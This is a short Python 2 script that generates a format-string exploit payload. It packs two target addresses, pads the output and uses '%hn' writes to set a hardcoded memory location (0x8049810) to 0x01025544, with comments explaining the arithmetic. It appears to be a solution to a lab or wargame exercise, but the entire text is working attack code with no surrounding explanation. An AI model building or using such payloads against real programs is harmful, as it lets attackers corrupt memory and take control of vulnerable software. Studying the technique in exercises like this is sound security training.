#!/usr/bin/python
import struct

# Target address to modify
addr = 0x8049810

# Build the payload
payload = ""
# Place the two target addresses at the beginning
payload += struct.pack("I", addr)       # For writing lower 2 bytes
payload += struct.pack("I", addr + 2)   # For writing upper 2 bytes

# Calculate padding for our writes
# Lower 2 bytes: Need to print 0x5544 (21828) characters
# After our 8 bytes of addresses, need 21820 more
first_padding = 21828 - 8

# Upper 2 bytes: Need to set 0x0102 (258)
# Since we already printed 21828, need to print (0x10000 + 258 - 21828)
# This results in a 16-bit overflow where only 0x0102 remains
second_padding = (0x10000 + 258) - 21828

# Build the full format string
payload += "%" + str(first_padding) + "d"  # Print first padding
payload += "%12$hn"                        # Write to first address
payload += "%" + str(second_padding) + "d" # Print second padding
payload += "%13$hn"                        # Write to second address

# Output the payload
print payload
